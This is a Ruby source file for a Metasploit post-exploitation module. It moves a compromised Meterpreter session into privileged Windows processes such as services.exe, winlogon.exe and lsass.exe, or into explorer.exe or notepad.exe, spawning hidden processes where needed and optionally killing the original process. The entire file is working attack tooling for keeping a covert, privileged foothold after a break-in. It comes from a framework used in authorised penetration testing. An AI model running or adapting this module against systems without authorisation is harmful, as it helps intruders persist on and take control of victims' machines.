##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Privilege Based Process Migration ',
      'Description'   => %q{ This module will migrate a Meterpreter session based on session privileges.
         It will do everything it can to migrate, including spawing a new User level process.
         For sessions with Admin rights: It will try to migrate into a System level process in the following
         order: ANAME (if specified), services.exe, winlogon.exe, wininit.exe, lsm.exe, and lsass.exe.
         If al these fail, it will fall back to User level migration. For sessions with User level rights:
         It will try to migrate to a user level process, if that fails it will attempt to spawn the process
         then migrate to it. It will attempt the User level processes in the following order:
         NAME (if specified), explorer.exe, then notepad.exe.},
      'License'       => MSF_LICENSE,
      'Author'        => ['Josh Hale <jhale85446[at]gmail.com>'],
      'Platform'      => ['win' ],
      'SessionTypes'  => ['meterpreter' ]
    ))

    register_options(
      [
        OptString.new('ANAME', [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),
        OptString.new('NAME',  [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),
        OptBool.new(  'KILL',  [false, 'Kill original session process.', false])
      ], self.class)
  end

  def run
    # Populate target arrays
    admin_targets = []
    admin_targets << datastore['ANAME'] if datastore['ANAME']
    admin_targets << "services.exe" << "winlogon.exe" << "wininit.exe" << "lsm.exe" << "lsass.exe"

    user_targets = []
    user_targets << datastore['NAME'] if datastore['NAME']
    user_targets << "explorer.exe" << "notepad.exe"

    # Get rights information
    admin = is_admin? ? 'True' : 'False'
    sys   = is_system? ? 'True' : 'False'

    # Get current process information
    original_pid = client.sys.process.open.pid
    original_name = client.sys.process.open.name
    print_status("Current session process is #{original_name} (#{original_pid}) as: #{client.sys.config.getuid}")

    # Admin level migration starts here
    if admin == 'True'
      if sys == 'False'
        print_status("Session is Admin but not System.")
        print_status("Will attempt to migrate to a System level process.")
      else
        print_status("Session is already Admin and System.")
        print_status("Will attempt to migrate to specified System level process.")
      end

      # Try to migrate to each of the System level processes in the list.  Stop when one works.  Go to User level migration if none work.
      admin_targets.each do |target_name|
        if migrate(get_pid(target_name), target_name)
          kill(original_pid, original_name) if datastore['KILL']
          return
        end
      end
      print_error("Unable to migrate to any of the System level processes.")
    else
      print_status("Session has User level rights.")
    end

    # User level migration starts here
    print_status("Will attempt to migrate to a User level process.")

    # Try to migrate to user level processes in the list.  If it does not exist or cannot migrate, try spawning it then migrating.
    user_targets.each do |target_name|
      if migrate(get_pid(target_name), target_name)
        kill(original_pid, original_name) if datastore['KILL']
        return
      end

      if migrate(spawn(target_name), target_name)
        kill(original_pid, original_name) if datastore['KILL']
        return
      end
    end
  end

  # This function returns the first process id of a process with the name provided.
  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
  def get_pid(proc_name)
    processes = client.sys.process.get_processes
    processes.each do |proc|
      return proc['pid'] if proc['name'] == proc_name
    end
    return nil
  end

  # This function attempts to migrate to the specified process.
  def migrate(target_pid, proc_name)
    if !target_pid
      print_error("Could not migrate to #{proc_name}.")
      return false
    end

    begin
      print_status("Trying #{proc_name} (#{target_pid})")
      client.core.migrate(target_pid)
      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    rescue ::Exception => e
      print_error("Could not migrate to #{proc_name}.")
      print_error(e.to_s)
      return false
    end
  end

  # This function will attempt to spawn a new process of the type provided by the name.
  def spawn(proc_name)
    begin
      print_status("Attempting to spawn #{proc_name}")
      proc = session.sys.process.execute(proc_name, nil, {'Hidden' => true })
      print_good("Successfully spawned #{proc_name}")
      return proc.pid
    rescue ::Exception => e
      print_error("Could not spawn #{proc_name}.")
      print_error(e.to_s)
      return nil
    end
  end

  # This function will try to kill the original session process
  def kill(proc_pid, proc_name)
    begin
      print_status("Trying to kill original process #{proc_name} (#{proc_pid})")
      session.sys.process.kill(proc_pid)
      print_good("Successfully killed process #{proc_name} (#{proc_pid})")
    rescue ::Exception => e
      print_error("Could not kill original process #{proc_name} (#{proc_pid})")
      print_error(e.to_s)
    end
  end
end

